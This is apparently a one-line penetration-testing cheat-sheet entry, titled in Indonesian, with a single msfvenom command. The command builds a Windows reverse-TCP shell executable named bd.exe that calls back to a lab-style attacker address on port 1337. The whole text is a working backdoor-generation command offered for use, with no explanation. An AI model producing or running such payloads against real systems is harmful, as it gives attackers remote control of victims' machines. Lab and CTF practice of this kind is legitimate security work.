# msfvenom dengan Backconnect.exe

    msfvenom --platform windows --payload  windows/shell/reverse_tcp LHOST=10.10.14.12 LPORT=1337 -b "\x00" -f exe -o ./bd.exe